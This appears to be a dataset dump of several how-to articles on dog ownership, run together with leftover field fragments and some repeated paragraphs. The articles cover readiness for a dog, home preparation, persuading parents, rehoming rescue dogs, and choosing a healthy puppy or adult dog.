A dog can strain relationships within your household as well. Two common issues are disagreements on discipline and training, and unequal burden of dog care., Since you have a lot of time, a puppy might be right for you! Puppies demand a constant watchful eye for at least six months, since they are untrained and urinating every couple hours. Basic training can take a year.Even if you have lots of time to train and dote on your puppy, you cannot predict what the adult dog will be like once it reaches mental and emotional maturity by age two or three.A young puppy might not be best if you're looking to fill your time with companionship. While you're cleaning up its mess and worrying, the puppy will be sleeping 16–20 hours a day.Strenuous exercise should be kept to a maximum of two sessions a day, each one no more than 5 minutes long per month of age., Different dog breeds and individuals prefer different activities. Choose one that matches your own lifestyle, so you can enjoy your time together:

For indoor relaxation, choose a more sedate breed such as a greyhound or pug, or an older dog. These still need half an hour of daily exercise to stay healthy, but low-energy dogs can handle a lazy day now and then.If you enjoy running around your neighborhood, an energetic breed such as a retriever or terrier is a great choice of companion.
Hikers should choose a fit dog at least one year old. Short-term energy isn’t enough if you’ll be trekking for several hours: pick a breed with good endurance, such as an Australian shepherd, husky, or lab retriever (with a coat suited to your climate)., Even though you have more time, some studies suggest dog training works best when you stick to one or two fifteen-minute sessions per week. If you want to be done with training in less time (in terms of weeks), you can increase this to daily sessions or to 45-minute sessions, but the dog might not learn the commands as well.These studies focused on one command at a time. It's plausible that a dog could learn well with four or five sessions a week if you split the time between multiple commands.

Attending a training class with your dog can help the two of you bond and learn how to interact with each other. Your pet can socialize with other dogs, and you can trade tips with the other owners.
People with great discipline and patience may find training very rewarding. If the idea appeals to you, train the dog in an agility course and consider competitions.

, Every dog enjoys time outside with its owner, but different breeds and individuals have different preferences. If you want to bring your dog camping or on a day trip, check that it doesn't get carsick before you sign the adoption papers. Many breeds have special interests that might match your own, such as a retriever's or water spaniel's love of swimming, or a malamute's or Bernese mountain dog's enjoyment of the cold and snow., Fetch, tug-of-war, and hide-and-seek are three great games to play with your dog. Hunting breeds such as pointers and terriers thrive on mental and physical stimulation, so look into canine puzzle toys, hunting training, or ""find the object"" games if you plan to adopt one of them.

Although all you need for most games is a chew toy or something to throw, incorporate treats so you can teach the dog how to behave. For example, while playing tug-of-war, stop pulling and say ""Drop it,"" then give the dog a treat when it responds. Show the treat in your other hand if the dog won't let go.

, Disciplined, energetic dogs can learn to compete in frisbee, flyball, or even freestyle dancing!If any of these pique your interest, look for an intelligent, active dog that seems eager to please.Do not train a dog for competitive sports if it belongs to a breed with extreme physical limitations. This is especially true for most brachycephalic (short-headed) breeds such as bulldogs.

, Dogs are domesticated animals, and are much happier living indoors with their human companions.Don't rule this out just because you have a small home. Many people raise happy dogs in studios or trailers, but it does take thought and consideration:

If you’re burning off the dog’s energy by running or playing fetch each day, it can be a quiet companion the rest of the time. Some breeds such as mastiffs, pugs, or greyhounds may be happy with thirty minutes of strenuous exercise a day.Herding and sporting breeds may bounce off the walls unless you can take them out for hours every day.The dog's size matters less than its energy level. If it gets exercise, it can be calm and happy anywhere that you can.
If your dog doesn't have space to run inside, you'll need a nearby outdoor area. This can be a fenced-in yard, a dog park, or a public park or beach that allows dogs.
If winters are severe in your area, you'll need enough indoor space to play fetch.

, Do not keep a dog outdoors unless it gets hours of attention each day, and there is no way to make indoor living work. At minimum, the dog needs a dog house that protects the dog from weather and temperature extremes, and plenty of room to run around untethered.Even then, the dog is likely to develop bad habits such as barking or compulsive chewing unless it receives regular attention from people throughout the day.

You may also need to follow laws that set minimum requirements for outdoor living spaces and dog care.Consult a local veterinarian for more information.

, If you rent your living space, read the lease or talk to your landlord before getting a dog. Even if pets are allowed, the landlord might charge a pet fee (one time or monthly), to be returned when you move out if your pet hasn’t caused any damage. Other landlords may require you to purchase renter’s insurance that covers canine-inflicted injuries.If you already have renter’s or homeowner’s insurance, check whether it covers dog-related injury and damage. If it doesn’t, consider additional pet liability insurance or an umbrella policy that does.You may have trouble finding insurance for breeds with a poor reputation. This includes Rottweilers, pit bulls, German Shepherds, and Doberman Pinschers., It can be risky to keep a dog in the same household as a child aged six or younger, since the child may not be able to interact with the dog safely. Children of any age should be taught how to avoid provoking the dog (no hitting, shouting, or grabbing — not even hugs and kisses). Show them how to pet the dog nicely, and teach them to read the dog's body language. If the dog freezes, tenses its mouth, bristles its tail, or tries to slink away, the child should immediately leave it alone.Even a sweet dog and a gentle child are best supervised while together, which adds more work to a busy parent’s life.Make sure the dog is vaccinated against all vet-recommended diseases, and work to prevent worms, which can spread to children via the faeces.
Retrievers, beagles, bulldogs, and pugs are examples of breeds that make good family dogs.If you’re adopting an adult dog, choose a calm animal that has lived with children before if possible.

, A puppy or untrained dog can wreak havoc on furniture, house plants, and anything else within reach. You can minimize this problem by adopting a trained, adult dog, but you’ll still need to deal with an unbelievable amount of fur. You can reduce shedding through diet and regular grooming.

“Hypoallergenic” or ""low-shedding"" dogs such as poodles, Scottish terriers, and labradoodles will keep your carpets cleaner, but they still need grooming. Some of these breeds need regular haircuts to keep their coat in check, while others need frequent brushing to release trapped hairs., If you think you could accommodate a dog, be prepared to make some changes. Move electrical cords and breakables out of reach, at least until your dog is trained and used to the new home. Install locks on low cabinets, as well as all cabinets that contain cleaning products and strong chemicals. Vacuum your floors and carpets to pick up anything that might stick in a dog's throat or make it sick.


Educate your household about dangerous foods. Many common foods can injure dogs, including chocolate, grapes, raisins, onions, garlic, and chives. Keep these in high cupboards and never leave them within the dog's reach.

Check whether your houseplants are poisonous to dogs.Move these to dog-free rooms or high surfaces, along with any precious plants you couldn't stand to see chewed.

, If you think you could accommodate a dog, be prepared to make some changes. Move electrical cords and breakables out of reach, at least until your dog is trained and used to the new home. Install locks on low cabinets, as well as all cabinets that contain cleaning products and strong chemicals. Vacuum your floors and carpets to pick up anything that might stick in a dog's throat or make it sick.

, Your dog will be much happier living indoors with you than stuck outdoors. If you don't want it to have full run of the house, block off private rooms with a baby gate. Dogs don't need much space as long as they're getting enough exercise, but they do appreciate a quiet spot to relax. This can be a crate for crate training, a dog bed, or just a pile of blankets.Avoid accordion-style gates, since a dog can get its head stuck in the folds.
If keeping a dog indoors is absolutely impossible, you can build a dog house in a fenced-in yard. Talk to a vet first to make sure you can provide the dog with the companionship it needs, and to confirm the dog house protects your dog from weather and follows animal rights laws in your area.

, You don’t need a backyard to raise a dog, but your animal will be happier with a regular chance to run around. If you live in the city, look for dog parks nearby where your pet can play with other dogs.

This is especially important for working breeds, such as retrievers and terriers.

, A puppy or untrained dog can wreak havoc on furniture, house plants, and anything else within reach. You can minimize this problem by adopting a trained, adult dog, but you’ll still need to deal with an unbelievable amount of fur. You can reduce shedding through diet and regular grooming.

“Hypoallergenic” dogs such as poodles or Scottish terriers do still shed, but they do so less often or tend to trap the hairs in their coat. Your carpets will stay cleaner, but this doesn’t necessarily mean you can get away with grooming less often., It can be risky to keep a dog in the same household as a child aged six or younger. The child may not understand how to interact with the dog, which can lead to bites or other injuries. Children of any age should be taught how to read the dog’s body language and to avoid provoking the dog.Make sure the dog is vaccinated against all vet-recommended diseases, and work to prevent worms, which can spread to children via the feces.
Retrievers, beagles, bulldogs, and pugs are examples of breeds that make good family dogs.If you’re adopting an adult dog, choose a calm animal that has lived with children before if possible.

, Adding a four-legged friend to your vacation plans isn’t easy. A good-tempered dog can accompany you in the car or on a plane, but every hotel and excursion you choose has to be pet-friendly. Think about introducing the dog to a trusted pet sitter early, so someone familiar can watch it while you’re away. Many dogs do not respond well to being left alone, especially at kennels or with a stranger.


The average cost of pet sitting varies from US $10 a day in rural areas to $30 a day in expensive cities.It’s common for pet sitters to charge extra if your dog is poorly behaved, if it requires special medication, or if you have multiple pets.
Kennels start at $25–$45 a day in a typical US city, and may offer discounts for long stays or multiple dogs., Keep in mind that a dog will limit your options due to pet restrictions in leases and homeowner associations. Be prepared to crate train your dog in advance so transport is less stressful, and allow extra time during the move to introduce your pet to your new home.If you will be moving somewhere the dog cannot follow, such as college, think about the dog’s new living situation. Will your family or housemates take good care of the dog?

, A new baby is one of the most common reasons people give up their pets.If you plan on having a child soon, consider delaying the dog adoption until the kid is in school.If you decided to adopt a dog anyway, train the dog well and be prepared for time consuming preparation leading up to the baby’s arrival. Starting with a baby doll and a recording of baby sounds gives the dog time to adapt before the real challenge starts., Most dog breeds have an average lifespan between 10 and 15 years.Before adopting a puppy or young adult dog, think about what your life might look like a decade from now. If this is a family dog, what will happen when the kids move out? Do you have a dream to travel around the world? A dog is a serious, long-term commitment. If you’re not sure where you’ll be in a few years, now might not be the time to adopt."

Understand that dominating your dog will not work.,
Keep in mind that puppies learn by result.,
Consider enrolling your puppy in an obedience training course.",How to Prepare for a Puppy3," Dominating the puppy in order to make him behave is regarded as old-fashioned now. The observations of wolf packs which lead to the theory of dominance hierarchy were made on wolves kept in a zoo under artificial and stressful conditions. The conditions forced the wolves to behave in an aggressive, challenging way to one another, but wolves in the wild do not behave this way. Wolves in the wild live as family units and cooperate with each other.Try to think of yourself as a more mature member of the family who will guide your puppy (a new member) to be well-behaved and offer gentle correction whenever he steps out of line.

, Young puppies love to explore and experiment. Puppies will repeat behaviors that give them pleasure, such as playing with a ball. They will not repeat behaviors that get no response or that are unpleasant (such as disturbing a bee and getting stung).Ignore your puppy if he displays bad behavior and give him lots of praise if he displays good behavior. Reward your puppy with treats and praise when he obeys a command or does something good, like going potty outside.Make sure that you set firm rules and apply them in a consistent way.

, An obedience training course will help you to develop some appropriate strategies for responding to your puppy’s behavior. It will also give you an opportunity to bond with your puppy and give him a chance to socialize with some other puppies.Check with your local pet store, groomer, or veterinarian to find out about puppy training classes in your area.

Make sure that you are ready for dog ownership.,
Figure out a way to help with the cost.,
Pull your weight with household chores.,
Keep your grades up.,
Show them that you can take care of something.,
Do a test run.,
Give them time to think about it.",How to Persuade Your Parents to Get a Dog2," It’s very easy to fall in love with the idea of dog ownership, especially after watching a great dog movie, but the reality requires a great deal of work. Even though you may like the idea of getting a dog, are you really ready for the time, expense, and effort? Will you be willing to give up some of your social time to spend time with your dog?

, Dogs can be expensive because of the cost of food, grooming, veterinary care, and toys. Think about how you can help out with this household expense. Then, offer to pay for all, or some, of the dog’s expenses. You will need to stick to this promise, so make sure that your money making ideas are realistic.You can offer to do odd jobs around the neighborhood, deliver newspapers, or use your savings or birthday money to help with the cost of buying the dog.

, If you want your parents to see that you'd be a great dog owner, then you have to be able to do the basics: make your bed, keep your room clean, wash the dishes, and do anything that is required of you. Then, take it to the next level and pick up more household chores, help cook dinner, mow the lawn, do laundry, and maybe even make your parents coffee when it looks like they need caffeine or do whatever you can to go above and beyond what is required of you., If you want your parents to see that you can handle the added responsibility of a dog, then you should make sure to keep your grades up as you continue to ask to add a new member to your family. If you can, try to do even better in school to show them that you're committed to working hard and doing whatever it takes to get the dog.If you decide to make a verbal promise to your parents, be as specific as you can. You might say, “I will keep my grades in math at an A.” Or, “I will score an A on all of my science tests.”

, Have your parents give you something to take care of for a set amount of time. It can be an egg (don't let it break!), a sack of flour, a plant, or even a hamster. Doing well on this test run may show your parents that you're responsible and serious about wanting a dog. Though this may seem silly, you should treat the situation with the utmost seriousness.

, If you have a friend or family member who needs someone to take care of his or her dog for a little while, volunteer to help. Taking good care of the dog for a few days will show your parents that you're ready to take on a pet, and it will make them see how happy you are to be hanging out with a furry creature.

, Remember, don't ask them over and over every day, or they will shut you out. If they say no, keep showing maturity and understanding, keep being helpful in the house, and occasionally mention the dog, to get them used to the idea. Being patient will also show them that you're so committed that you're willing to wait.

Show them that you will walk the dog.,
Assure them that the dog won't destroy their home.,
Create a food and water chart.,
Think about house training.,
Provide a list of recommended veterinarians.,
Make a plan for vacations and other extended outings.,
Be willing to wait to adopt.",How to Persuade Your Parents to Get a Dog3," They may be worried that you will get the dog, get bored, and force them to take care of the little creature instead. Tell them that you've already selected the best walking times for the dog and are determined to walk the dog every day; if you have a sibling, show that you've split up the walking duties. To prove your point, you can even go for walks on your own during the appointed doggie-walking times., Your parents may be worried that the dog will chew up all of their furniture and cords, bring dirt into the house, and shed all over the place. It's your job to show them that none of this will happen. When you talk with your parents about their concerns, make sure to:


Tell them that you'll get the dog plenty of chew toys to make sure the dog doesn't chew the furniture. As for any loose cords or wires, tell them that you'll tape or cover them up, which will make your house look more orderly anyway.
Explain how you'll prevent the dog from tracking dirt into the house. You can explain that you'll clean the dog's paws in the garage or the back porch before the dog sets foot into the house again.
Discuss how you will prevent the dog from shedding too much. Dogs shed, but you can explain to your parents that you'll make a cleaning schedule to clean up the fur.
Let them know that you plan to give the dog a weekly bath, or bathe it however often is necessary for the breed.

, Your new dog will need to eat at least once, but usually twice, per day. Do some research to determine whether or not you’ll go with wet, dry, or combination dog food. Find a food that is nutritious, but also fits your budget. Then, craft a chart showing when the dog will eat and how much. You can also estimate food cost over time., If you plan to adopt an older dog, they may already be house-trained. However, you will likely need to work with a puppy or younger dog on their bathroom skills. Be prepared to talk with your parents about how you will not only pick up the poop, but will also clean up and place pee pads in the home., Show them that you'll be able to give the dog medical care. Do your research in advance and find the best vet in your area. Ask your friends with dogs which vets they recommend, or do research on your own. Try to find a vet that is close to home so you can walk to his office if you don't drive, and show your parents that you've already done your research and can take care of it., Show them that you have a game plan for watching the dog if your family goes on vacation. Your mom might ask, ""What will we do when we go away to the beach for a week?"" Don't get caught off guard and do your research in advance. Find a doggie daycare nearby that can take your dog in, or find a close friend or neighbor who is willing to take care of the dog., Show them that you won't get bored with the dog. Your parents may worry that once you get the dog, you'll stop taking care of it after a few weeks. To ease their concerns on this front, tell them that you're willing to wait a few months and to keep discussing the dog to show that this isn't just a passing phase; you're really committed to getting a dog and are willing to wait to show them how dedicated you really are.

Section off a dog-friendly area.,
Be ready to bring the dog home.,
Make sure you have the time to acclimate to a new dog.,
Pick the dog up.,
Give the dog a chance to explore.,
Don't lead with pity.",How to Rehome a Rescue Dog2," Before you bring your dog home, make an area that's dog-proof for your dog to stay in for the first week or two. Making it dog-proof includes removing plants, taping down cords, and removing chemicals. You may need baby gates to section off your house. Include a crate and/or a bed in the area for your dog to retreat to., Have all the necessary supplies ready at home, such as food and water bowls, a leash, food (ask the shelter what the dog has been eating), a collar, and a carrier. Also, make sure to have an identification tag to put on the collar with your number on it, just in case the dog gets loose., While you don't want to spend weeks at home with your dog and then go back to work (that can lead to separation anxiety), spending a few days at home with your new dog can help it adjust. Therefore, think about adopting when you have a few days off from work.However, make sure you do leave the dog alone for short amounts of time in the first couple of days, so it gets used to you being gone (and returning!).

, Make sure to bring the leash, collar, tag, and carrier to the shelter. Put the dog in the carrier for traveling, as it will help the dog feel more secure. Place the dog on the floor behind your seat if possible. If not, secure the dog carrier on the back seat with a seat belt., When the dog gets home, let it use the restroom outside. Next, bring the dog in, and let it be for a little while. Don't try to engage it right away. Rather, let it wander around the house to see what its new home is like, so it can begin to get used to it., You may feel sorry for your new dog, but showing pity is not a good way to start of the relationship, as it can lead you to be to soft with it, and your dog can sense that. That doesn't mean you should be aggressive or cruel with it. Rather, you need to be both consistent in your rules and accepting of the fact that your dog may make mistakes."
"
Keep it low-key.,
Socialize early.,
Work on positive training.,
Ask for help.",How to Rehome a Rescue Dog3," Don't give your dog too much excitement at first. Let your dog get used to its new surroundings before you start having it spend time with the whole family at once. Also, keep in mind that some objects may be triggering to your dog if it was in an abusive home, including newspapers, leashes, and collars. You'll need to be patient., You shouldn't try to socialize your dog in the first couple of days. However, having your close friends and family come over several times in the first couple of weeks gives your new dog a chance to get to know them before settling into a routine of ""friend"" and ""stranger.""Keep the visits low-key. Don't force interaction. Rather, let your dog approach each person as they come in.

, Start by encouraging positive behaviors. For instance, when the dog asks to go outside to the bathroom, give it a treat. If you notice it lays down in the backroom for some quiet time, give it a treat. Treats will let the dog know that you like those behaviors.After a time, you can start working on commands, such as sit.
Stick to the same commands. That is, make a list of the commands you will use for each action, and then post that list on the fridge or somewhere everyone can see. You don't want to confuse your dog by switching commands all the time., If you are having problems with your new dog, don't just give up. Instead, talk with the rescue. They may be able to provide you with the support you need, such as helping you learn what to do about behavioral problems. Try to work through a solution before returning the dog to the rescue."
"
Consider other options.,
Have the dog spayed or neutered.,
Make sure your pet is groomed.,
Work on behavioral issues.,
Get the dog checked out.,
Talk to the breeder or original rescue.,
Call other rescues.,
Try to find a new home for the dog yourself.,
Remember it takes time.",How to Rehome a Rescue Dog4," That is, you may find that you don't actually need to give your dog away. If you're moving to a new area, you should be able to find a rental that accepts pets, for instance. You can find solutions to many of the common problems that would cause you to give a dog away.If you don't have time to walk the dog enough, consider hiring a dog walker. Often, you can find a neighborhood kid who's willing to do it for a small fee.
If someone in the family has an allergy, think about options such as allergen air purifiers and allergy pills. Vacuuming, dusting, and sweeping often can also help with allergens.
If your dog has a behavioral problem, consider taking it to a training school to help deal with the problem.
If you or your spouse is pregnant, don't worry. Most of the time, dogs get along just fine with a new addition to the household.

, The truth of the matter is a dog who is spayed or neutered has a much better chance of being adopted than one who is not. Most people prefer a pet that has already had this procedure done.If you're worried about cost, you'll find that most communities have low-cost spay and neuter programs. Sometimes, these programs only roll around monthly or quarterly, so ask your vet if they know when the next low-cost clinic will be.

, A scruffy-looking dog is harder to rehome than a clean dog who has recently been brushed and trimmed. Take your dog out to a groomer if you can, so it looks its best. If you can't afford a groomer, do your best at home to make the dog presentable by bathing and combing the dog., If possible, work on behavioral issues before trying to rehome your dog, including potty training. A dog who is potty trained is much more likely to be adopted than one who's not. In addition, a dog who is at least somewhat sociable will do better than one who's not.If your dog needs to work on some behavioral issues, consider taking it to a trainer for a little while to help work on those issues.

, Take your dog to the vet to have its health checked. Make sure its had all of its shots and is up-to-date on any medications it may need, such as heartworm medication. Making sure your dog is healthy will make it more adoptable., If you got the dog from a breeder, the breeder will often take the dog back if you don't want it anymore. Additionally, you may be able to find a spot more easily at a rescue if you take it back to the original rescue you got it from.Most rescues will automatically take a dog back that they've had before.

, Look online to find rescues in your area. You can also call your vet to see if they have any recommendations. As you call the rescues and shelters, see if any of them will be willing to take your dog. Prioritize rescues over shelters, as shelters often employ kill policies if they have too many pets.If a rescue is full, they won't be able to take your pet. However, you may be able to get on a waiting list.
Ask the rescue to put up a post about your pet if they can't take your pet in. Most rescues will do that much.

, While placing a dog in a rescue will make it easier on you, you can work to find a new home for your dog without the help of a rescue. It just takes some work on your part to advertise your dog in your community.Start by taking a good photo of your dog. That photo is going to help sell your dog to its new owner.
Post fliers around your neighborhood with a picture of the dog, your number, the purpose of the flier (""Needs a good home!""), and a story about why you need to give the dog up. For instance, if you need to give the dog up to move to a nursing home, that's likely to win some sympathy and a possible new home for your dog. Also include a few details, such as the breed, weight, and temperament of the dog, as well as if it is spayed or neutered.Use social media, too. Find local community groups on social media, including dog groups, and post about your dog and why it needs a new home.
Take the dog out. Go go the dog park, the pet store, the neighborhood park, and anywhere else dogs are allowed. Give your dog a chance to interact with other people, as it may be able to charm someone into taking it home.

, You may be in a hurry to find your dog a new home because of an emergency or something you can't control. However, finding a dog a new home can take time, so be as patient as you can possibly be."
"
Observe the puppy’s parents.,
Examine the puppy’s physical health.,
Watch how the puppy interacts with his littermates.,
Look at how the puppy reacts to people and noises.,
Ask questions.,
Analyze your budget.,
Determine if your home and lifestyle are conducive to puppy ownership.,
Do your research.",How to Pick the Perfect Puppy," Genetics play a significant role in how a puppy will look and behave.It is likely that the puppy you are considering will have many of the same physical and behavioral traits as his parents. Therefore, taking a long a good look at his parents first will help you determine if the puppy will be perfect for you.


If you are working with a breeder, ask him or her if you can see the puppy’s parents. Whether the parents have traits that you like or dislike, chances are that the puppy will have those traits as well.Keep in mind that breeders usually have only the mother on the premises. The father (known as the sire) is usually in a different location. If this is the case, you can ask the breeder for paperwork on the father.It will probably not be possible to obtain information about a puppy’s parents at an animal shelter.;
, Good physical health is an important factor to consider when selecting the perfect puppy.Make sure to look the puppy over from head to toe, taking time to examine each body part and identify any abnormalities that could cause medical problems (and expensive veterinary bills) later in the puppy’s life.


Look at the puppy’s eyes—they should be bright and clear without any crusts or discharge.Look at the entirety of the puppy’s face, including the ears, nose, and mouth. His ears and nose should be clean and free of discharge, and his gums should be pink.Watch and listen to the puppy’s breathing. The puppy’s breathing should be quiet and easy. You can watch his chest as he breathes.Look at and examine the puppy’s bone structure. Bone abnormalities could indicate nutritional deficiencies or genetic musculoskeletal abnormalities that would require veterinary care.Check the puppy’s overall body condition. The puppy should look well fed, with some fat over his rib cage. If he is well fed, his coat will look shiny or glossy.Have the puppy examined by a veterinarian if you are unsure that you can perform a thorough physical examination on your own.

, Another factor to consider is the puppy’s temperament—how he responds to people and other animals, as well as how he reacts to sights and sounds in his environment.Observing the puppy’s behavior in different situations can help you determine if he is perfect for you.


A puppy who plays well with his littermates (e.g., doesn’t mind being on the top or bottom of the pile) and enjoys their company will likely grow into a well-adjusted adult.If the puppy would rather be alone or seems to get pushed around a lot by his littermates, he may not grow up to be very confident or sociable.A puppy with a dominant behavior will approach his littermates with an upright posture and perky ears, rather than a lowered head and ears pointed backward (submissive behavior).Observe how the puppy responds when his littermates yelp at him for playing too roughly.A puppy who adjusts his play accordingly is showing that he can understand and stay within appropriate social boundaries.
It is helpful to observe the puppy’s interactions with his littermates before you interact with him., The perfect puppy will know how to act properly around people. You can test your puppy’s temperament around people in many ways. For example, you can call the puppy to you and see how he responds. A friendly puppy will eagerly walk towards you and enjoy the attention.A fearful puppy may run away from you or display behavior such as tucking his tail or staying in a cowered position. An independent puppy would like ignore your calls.You can also cradle the puppy in your arms to see how he reacts to being held. He may enjoy it (e.g., relaxed and calm body language), or he may do everything he can (e.g., squirm, snarl, bite, defecate) to try to get out of your arms as quickly as possible.Clap your hands or make another loud noise—just once—to test how the puppy responds to sudden loud noises. A puppy who is overly sensitive to loud noises may be a challenge, since he would likely not be able to enjoy different activities with you.You can also observe if the puppy has a tendency to guard things. A negative response to you approaching him when he is eating (e.g., snarling, biting), could signal a serious behavioral problem that could get worse as he grows older.Testing the puppy’s jaw control is also important. It is a good sign if he loosens his jaws when you let him know (‘ouch!’) that he’s bitten too hard. A puppy who ignores your reaction could develop a biting problem that worsens over time unless resolved promptly., Whether you are working with a breeder or visiting animal shelters, do not be afraid to ask plenty of questions about the puppy and the business. Ask questions about how the puppies are raised and socialized, how the breeder handles the whelping (birthing) process, and if the puppy’s parents have been tested for breed-specific diseases.Regarding the individual puppy, ask questions about his medical care—vaccination history, deworming history, presence of a microchip.For a purebred puppy, asking the breeder for the dog’s registration papers is a good idea.Asking plenty of questions will help you be confident that you are picking a puppy from a reputable and respected business.

, Owning a puppy will add several expenses to your monthly budget—food, toys, veterinary care, obedience classes, etc. The exact cost will vary between breeds, but you should expect to spend about $100 to $150/month on puppy-related expenses in the first year.Keep in mind that buying from a breeder will probably be more expensive than buying a puppy from an animal shelter.

, Even if your budget can handle puppy-related expenses, you will need to think about how owning puppy could affect your current life situation. For example, if you are living in an apartment, there may be breed or weight restrictions that could impact your choice of dog breed.If your work requires frequent travel, owning a puppy would likely not be practical. Puppies are very time-intensive, and your time away from home would negatively affect your ability to care for and train a puppy.If you have a busy home life, you will need to determine if you will have the extra time to commit to raising a puppy.
Do not feel disappointed if you determine that now is not the right time to own a puppy. It is better to come to that conclusion before you make the financial commitment to own one.

, Learning as much as you can about dog breeds and dog ownership is essential to picking the perfect puppy. There is an abundance of information on the internet to help prepare you for picking a puppy. The website http://www.akc.org/learn/dog-health/ has excellent information on many aspects of dog ownership.


Another helpful website is http://www.akc.org/find-a-match, which has a quiz you can take to determine which dog breed(s) may work best for your lifestyle.
You can also ask veterinarians, dog trainers, and reputable dog breeders for information on how to pick a puppy.Your local library will likely have a selection of books on dog ownership."
"
Be on guard with free classifieds.,
Check for availability.,
See what other dogs they offer.,
Evaluate the buying process.,
Double-check the seller through other sources.",How to Navigate Dog Classified Ads1," Before you start skimming through classified ads, check whether it’s free to post listings or if a fee is charged to do so. Expect to find puppy mills, backyard breeders, and scammers advertising dogs on free sites. Remember: their chief concern is making money, so obviously they’re going to spend as little as possible and certainly take advantage of free advertising.This doesn’t mean that sites that charge money to post listings are 100% free of untrustworthy sellers.
Also, just because a few bad apples use free sites doesn’t mean that everyone who posts on them is a bad apple, too.;
, Obviously, if someone has listed a dog for sale, then a dog’s available (assuming, of course, the someone in question isn’t a scammer). If possible, go back through the user’s history. Determine whether they seem to have a continuous supply of dogs available. If so, scratch this user off your list of potential sellers.Responsible breeders allow substantial breaks in between litters so the mother can fully recover before breeding again, meaning puppies are not always available for sale.Therefore, a seller who has dogs to sell at any time either is a strong indicator of a poor breeding environment., If an ad mentions multiple dogs for sale, check if they are all the same breed. If the ad only mentions an individual dog for sale, search through the seller’s other postings, both current and recent. Again, see if each dog listed belongs to the same breed. If not, consider the seller a no-go.Responsible breeders usually specialize in just one breed, never more than two or three.
A wide variety of breeds is a strong sign of cost-cutting and less-than-expert knowledge about any one breed.

, Check which payment method the seller insists on, if mentioned. Avoid cash-only, online, and sight-unseen purchases. Also check to see what (if any) steps you need to take before they will complete a sale. Although you may be eager to bring home a new dog as soon as possible, favor sellers who offer or even insist on visits and interviews before they are willing to sell.Trustworthy sellers should allow you to meet the dog, tour their entire breeding facility, meet the dog’s parents, and share its documentation and medical history before purchase.
Responsible sellers and breeders should be concerned about the dog’s future and just as keen to interview you as you are to talk with them.
Sellers and breeders should promise some form of guarantee that you can return the dog for any reason in case either you or it does not adjust to its new home., If the ad provides a link to the seller’s official website, copy-and-paste text from the website to a search engine to make sure they didn’t lift it off a more trustworthy source.If their site appears to be legit, contact other local organizations and/or individuals who may have dealt with or heard of the seller.

Pick a breed that has fewer health problems.",How to Pick a Healthy Adult Dog," Start your dog search at your local humane or animal rescue society to see what dogs are available. These groups are very good at making sure all animals in their care are in the best possible health.


Most shelters give their dogs a complete examination by a veterinarian and vaccinations.
Humane societies will not knowingly adopt out a sick dog and frequently will take one back within a few days if he becomes ill. Many will also give you free medication for illnesses discovered right after adoption.There are breed-specific rescues, too, from Chihuahuas to pit bulls to greyhounds.;
, If you have your heart set on a particular breed, you will need to turn to a breeder to find a dog. Contact local dog clubs in your area or talk to your veterinarian for suggestions of reputable breeders in your area.You can also contact the major dog breeding organizations or dog showing organizations in your area for suggestions. They usually have lists of approved breeders online for you to look over.

, An important thing to ask the breeder is about inherited diseases in the dog’s parents. Some common inherited diseases in dogs that can cause big health problems and expensive veterinary bills include hip dysplasia, abnormal tooth position, retained testicles, and some autoimmune diseases. Breeders should be able to offer veterinary proof that the parents are free of these diseases.


The Humane Society of the United States has a checklist of questions to ask a breeder. (You can find it here.)Print this off and take it with you to make sure all bases are covered. Responsible breeders will welcome your questions. They should want to make sure their animals are going to live with responsible owners, so don’t be shy about bringing the checklist.
Before you meet with a breeder do a little research. You should become familiar with the inheritable diseases that can be problems for the breed in which you're interested., You should get at least a week’s “money back guarantee” from the breeder. Some rescues will give you this guarantee as well, while some will take a dog back but will not give you a full refund.


A good breeder should be interested in placing her dogs in the right home. This means that you should be able to return a dog to a breeder, health problems or not, if it just turns out to be the wrong dog for your family., You will want to look at the dog’s health records and veterinarian examination findings. If a breeder can't give you these, it's a good sign that you should walk away from the situation.

, Regardless of where you find that “perfect” dog, you will need to spend a minimum of two hours with her before you commit to adopting her. Play with her to gauge her personality or try taking her for a walk to see how she deals with the world.One big issue with adult dogs is bad behaviors. You will want to make sure the dog is friendly to you, that she doesn’t have any bad habits (like biting or growling at you), and make sure you are generally comfortable with the dog.
If you are unsure after a few hours with the dog then sleep on the decision. Don't adopt the dog if you have misgivings. Instead, come back the next day and assess the dog again., Look at the dog closely as you play and interact with him. Check the following:Ears: Dirty ears may indicate an infection or ear mites. There should be no redness or foul odor to the ears.
Teeth: The teeth should be clear from any tartar or calculus (brown residue sticking to the teeth starting at the gum line). In dogs over five years of age, there may be a small amount of tartar on the big canine teeth and the teeth may be stained yellow. However, the gums, particularly where they meet the teeth, should not be reddened or swollen.
Nose: The nose should not have any discharge, however it can be wet from the dog licking. The dog should not sneeze or cough.
Eyes: The eyes should be bright and have no discharge from them or around them.
Coat: The coat should be clean and shiny. It can be a bit dusty or have some mud if dog has been playing outside but that should wipe off easily. Part the hair and look at the skin. It should be clear and smooth. Any redness or itchiness or evidence of fleas should alert you to poor care.
Body: The body should be strong even on tiny breeds. They should not be thin with protruding bellies. This can indicate an untreated worm infestation or more serious problems, like heart issues.
Desexing: The dog should be spayed (female) or neutered (male). If not, make sure the dog will be spayed or neutered within a month after bringing her or him into your home.

, There are other things to look for when assessing a potential pet's health. These include:Firm stool: Loose stool or stool around the rear end may indicate diarrhea. Ask to see the dog’s toileting area to make sure the stool is firm and to make sure the owner cleans up after his dog.
Excessive licking: A dog that licks his or her genital area often, especially a female dog, may have a urinary tract infection.

, If you do decide the dog is healthy and friendly enough to take with you, you will want to take her (and her health records) to your veterinarian within three days for an exam. During this exam the dog should get her vaccinations updated, a heartworm test, and have her stool checked for worms and parasites.It's also a good idea to start the relationship with a veterinarian before a real emergency arises.

, Many of the really bad health problems in dogs come from too much inbreeding. In an attempt to keep breeds ""pure,"" dog breeders have increased the likelihood of certain debilitating problems. To avoid many of these inbred congenital problems, adopt a dog that is a mix of several breeds.There can be some downsides to adopting a mixed-breed dog. The biggest of these is that you don't always know what breeds your dog is. This means that you may not know how big he is going to get or what his general temperament might be.

, Many health problems appear when a dog is very young or very old. If you want a better chance of getting a healthy dog, try getting a dog that is a couple years old. This means that the dog has passed adolescence but still has a number of years until she is considered a senior dog.Adopting an adult dog has the added benefit that you will know what kind of personality the dog has when you adopt her. The dog has matured already and should be more emotionally mature than a puppy.

, If you are concerned about health problems in a dog but you still want a purebred dog, pick a breed that is known to have few problems. Some argue that dog breeds that are bred for a job instead of looks, such as fox hounds being bred for hunting, are generally healthier.Breeders don't have to keep such specific physical traits in mind when picking breeding pairs, allowing for a wider breeding stock.


